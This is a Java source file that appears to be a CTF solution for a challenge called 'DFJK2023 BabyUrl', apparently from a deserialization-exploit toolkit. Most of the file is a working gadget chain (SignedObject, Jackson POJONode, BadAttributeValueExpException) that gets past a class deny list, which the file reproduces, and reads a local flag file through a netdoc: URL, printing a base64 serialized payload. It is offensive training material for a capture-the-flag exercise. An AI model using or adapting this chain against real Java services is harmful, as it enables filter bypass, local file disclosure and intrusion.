package dev.silente.javashark.solution;

import com.yancao.ctf.bean.URLHelper;
import com.yancao.ctf.bean.URLVisiter;
import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.jdk.GSignedObject;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.SerializeUtils;

import java.io.*;

public class DFJK2023BabyUrl {
    public static void main(String[] args) throws Exception {
        URLVisiter urlVisiter = new URLVisiter();
//        URLHelper urlHelper = new URLHelper("netdoc:/");
        URLHelper urlHelper = new URLHelper("netdoc:/F14gIsHereY0UGOTIT");
        ReflectUtils.setFieldValue(urlHelper, "visiter", urlVisiter);

        Object o = GSignedObject.getter2Deserialize(urlHelper);
        Object json = GPOJONode.toString2Getter(o);
        Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

        byte[] code = SerializeUtils.serialize(poc);
        System.out.println(MiscUtils.base64Encode(code));

//        ByteArrayInputStream bis = new ByteArrayInputStream(code);
//        ObjectInputStream ois = new DFJKObjectInputStream(bis);
//        bis.close();
//        ois.close();
//        URLHelper urlHelperNew = (URLHelper) ois.readObject();
//        System.out.println(urlHelperNew.url);
    }
}
class DFJKObjectInputStream extends ObjectInputStream {
    public DFJKObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();
        String[] denyClasses = { "java.net.InetAddress", "org.apache.commons.collections.Transformer", "org.apache.commons.collections.functors", "com.yancao.ctf.bean.URLVisiter", "com.yancao.ctf.bean.URLHelper" };
        for (String denyClass : denyClasses) {
            if (className.startsWith(denyClass))
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
        }
        return super.resolveClass(desc);
    }
}
